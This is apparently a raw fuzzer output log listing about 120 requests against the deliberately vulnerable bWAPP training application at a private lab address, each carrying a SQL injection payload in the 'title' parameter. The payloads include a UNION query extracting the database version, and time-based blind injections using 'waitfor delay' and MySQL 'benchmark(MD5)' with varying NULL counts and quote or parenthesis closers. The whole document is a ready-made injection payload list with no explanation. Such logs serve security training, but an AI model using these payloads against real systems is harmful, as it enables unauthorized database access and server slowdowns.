14,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='%20union%20(select%20NULL,%20NULL,%20NULL,%20%20(select%20@@version))%20--"
138,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
139,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
140,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
142,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
141,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
143,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
144,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=',NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
148,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
145,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=',NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
146,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title="",NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
149,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
147,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title="",NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
151,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
150,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
152,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
154,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
153,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
155,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=',NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
156,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=',NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
157,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title="",NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
158,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title="",NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
159,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
161,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
163,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
162,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
160,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
167,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=',NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
164,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
165,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
168,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=',NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
166,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
169,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title="",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
172,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
170,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title="",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
171,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
174,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
173,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
175,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
176,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
177,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
179,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
181,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title="",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
184,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
183,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
180,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
178,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
182,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title="",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
189,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=
190,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=waitfor%20delay%20'0:0:20'%20/*
185,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
192,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title='%20waitfor%20delay%20'0:0:20'%20/*
186,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
187,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
191,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=waitfor%20delay%20'0:0:20'%20--
188,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
195,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""%20waitfor%20delay%20'0:0:20'%20--"
193,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title='%20waitfor%20delay%20'0:0:20'%20--
197,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=)%20waitfor%20delay%20'0:0:20'%20--
194,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""%20waitfor%20delay%20'0:0:20'%20/*"
198,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=))%20waitfor%20delay%20'0:0:20'%20/*
196,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=)%20waitfor%20delay%20'0:0:20'%20/*
199,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=))%20waitfor%20delay%20'0:0:20'%20--
200,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=)))%20waitfor%20delay%20'0:0:20'%20/*
203,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=))))%20waitfor%20delay%20'0:0:20'%20--
202,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=))))%20waitfor%20delay%20'0:0:20'%20/*
205,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=))))))%20waitfor%20delay%20'0:0:20'%20--
204,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=)))))%20waitfor%20delay%20'0:0:20'%20--
201,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=)))%20waitfor%20delay%20'0:0:20'%20--
208,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title="")%20waitfor%20delay%20'0:0:20'%20/*"
207,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=')%20waitfor%20delay%20'0:0:20'%20--
206,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=')%20waitfor%20delay%20'0:0:20'%20/*
209,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title="")%20waitfor%20delay%20'0:0:20'%20--"
212,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""))%20waitfor%20delay%20'0:0:20'%20/*"
213,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""))%20waitfor%20delay%20'0:0:20'%20--"
211,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title='))%20waitfor%20delay%20'0:0:20'%20--
210,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title='))%20waitfor%20delay%20'0:0:20'%20/*
214,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=')))%20waitfor%20delay%20'0:0:20'%20/*
217,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title="")))%20waitfor%20delay%20'0:0:20'%20--"
215,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=')))%20waitfor%20delay%20'0:0:20'%20--
219,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title='))))%20waitfor%20delay%20'0:0:20'%20--
216,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title="")))%20waitfor%20delay%20'0:0:20'%20/*"
220,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""))))%20waitfor%20delay%20'0:0:20'%20/*"
218,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title='))))%20waitfor%20delay%20'0:0:20'%20/*
221,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""))))%20waitfor%20delay%20'0:0:20'%20--"
224,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title="")))))%20waitfor%20delay%20'0:0:20'%20/*"
223,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=')))))%20waitfor%20delay%20'0:0:20'%20--
222,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=')))))%20waitfor%20delay%20'0:0:20'%20/*
231,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=+if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*"
227,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title='))))))%20waitfor%20delay%20'0:0:20'%20--
230,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=
229,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""))))))%20waitfor%20delay%20'0:0:20'%20--"
225,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title="")))))%20waitfor%20delay%20'0:0:20'%20--"
228,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""))))))%20waitfor%20delay%20'0:0:20'%20/*"
232,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=+if(benchmark(3000000,MD5(1)),NULL,NULL))%20--"
226,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title='))))))%20waitfor%20delay%20'0:0:20'%20/*
233,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=+if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23"
234,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='+if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*"
235,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='+if(benchmark(3000000,MD5(1)),NULL,NULL))%20--"
240,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20/*"
236,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='+if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23"
239,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""+if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23"
238,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""+if(benchmark(3000000,MD5(1)),NULL,NULL))%20--"
237,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""+if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*"
243,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20/*"
241,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20--"
242,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20%23"
244,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20--"
245,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20%23"
252,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20/*"
253,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20--"
247,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20--"
246,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20/*"
248,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20%23"
249,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20/*"
255,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20/*"
250,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20--"
254,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20%23"
251,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20%23"
256,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20--"
258,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20/*"
257,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20%23"
259,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20--"
260,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20%23"
265,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20--"
263,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20%23"
267,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20/*"
266,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20%23"
261,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20/*"
262,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20--"
264,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20/*"
